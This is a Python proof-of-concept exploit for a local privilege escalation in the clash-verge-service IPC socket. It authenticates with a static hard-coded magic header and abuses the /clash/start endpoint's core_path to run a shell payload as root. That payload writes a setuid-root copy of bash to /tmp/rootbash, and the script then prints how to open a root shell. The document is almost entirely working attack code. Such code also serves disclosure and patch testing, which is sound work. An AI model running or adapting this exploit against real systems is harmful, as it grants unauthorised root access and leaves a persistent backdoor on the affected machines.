#!/usr/bin/env python3
# clash-verge-service-ipc (Linux/macOS) LPE PoC.
# Speaks kode-bridge HTTP/1.1 over the unix socket + the static X-IPC-Magic header.
# Unprivileged user (in the socket-dir group) -> root code execution.
#
# Usage: python3 poc_ipc.py [socket_path]
import socket, sys, os, glob, time

MAGIC = ("A thing of beauty is a joy for ever. Its loveliness increases; "
         "it will never pass into nothingness.")


def find_sock():
    cands = (["/tmp/verge/clash-verge-service.sock"]
             + glob.glob("/tmp/verge/*.sock")
             + glob.glob("/tmp/*verge*service*.sock"))
    for p in cands:
        if os.path.exists(p):
            return p
    return "/tmp/verge/clash-verge-service.sock"


def http(sock, method, path, body=None):
    h = [f"{method} {path} HTTP/1.1", "Host: localhost",
         f"X-IPC-Magic: {MAGIC}", "Connection: close"]
    if body is not None:
        h += ["Content-Type: application/json", f"Content-Length: {len(body)}"]
    req = ("\r\n".join(h) + "\r\n\r\n" + (body or "")).encode()
    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    s.settimeout(20)
    s.connect(sock)
    s.sendall(req)
    out = b""
    while True:
        try:
            c = s.recv(65536)
        except socket.timeout:
            break
        if not c:
            break
        out += c
    s.close()
    return out.decode(errors="replace")


def main():
    sock = sys.argv[1] if len(sys.argv) > 1 else find_sock()
    print("== socket :", sock)
    if not os.path.exists(sock):
        print("!! socket not found. Check:  systemctl status clash-verge-service ; "
              "ls -ld /tmp/verge ; ls -l /tmp/verge/")
        return

    # 1) connectivity + auth probe (no side effects)
    try:
        r = http(sock, "GET", "/version")
    except PermissionError:
        print("!! PermissionError connecting -> you are not in the group that owns /tmp/verge.")
        print("   run:  ls -ld /tmp/verge ; id    (need to be a member of that group)")
        return
    except Exception as e:
        print("!! connect/IO failed:", e)
        return
    print("\n[GET /version]\n", r.strip())
    if "200" not in r.split("\r\n", 1)[0]:
        print("!! probe did not return 200 -> magic/version mismatch or unreachable.")

    # 2) StartClash with core_path = root payload
    pay = "/tmp/cvs_payload.sh"
    with open(pay, "w") as f:
        f.write("#!/bin/sh\n"
                "id > /tmp/cvs_root_proof.txt 2>&1\n"
                "cp /bin/bash /tmp/rootbash 2>/dev/null && chmod 4755 /tmp/rootbash 2>/dev/null\n")
    os.chmod(pay, 0o755)
    body = ('{"core_config":{"core_path":"%s",'
            '"core_ipc_path":"/tmp/verge/poc-mihomo.sock",'
            '"config_path":"/tmp/x","config_dir":"/tmp"},'
            '"log_config":{"directory":"/tmp","max_log_size":1048576,"max_log_files":2}}') % pay
    print("\n[POST /clash/start]\n", http(sock, "POST", "/clash/start", body).strip())

    # 3) verify root execution
    time.sleep(0.6)
    proof = "/tmp/cvs_root_proof.txt"
    print("\n== proof:", proof)
    try:
        owner = os.stat(proof).st_uid
        print("   exists, owner uid =", owner, "(ROOT -> privesc confirmed)" if owner == 0 else "")
        try:
            print("   content:", open(proof).read().strip())
        except PermissionError:
            print("   content unreadable by you because the file is ROOT-OWNED -> success")
    except FileNotFoundError:
        print("   (missing) -> core_path was not executed; read the response above")
    rb = "/tmp/rootbash"
    if os.path.exists(rb):
        st = os.stat(rb)
        suid = bool(st.st_mode & 0o4000)
        print(f"== /tmp/rootbash : mode={oct(st.st_mode & 0o7777)} owner={st.st_uid} suid={suid}")
        if suid and st.st_uid == 0:
            print("   -> run:  /tmp/rootbash -p   for a root shell (euid=0)")
    else:
        print("== /tmp/rootbash : absent")


if __name__ == "__main__":
    main()
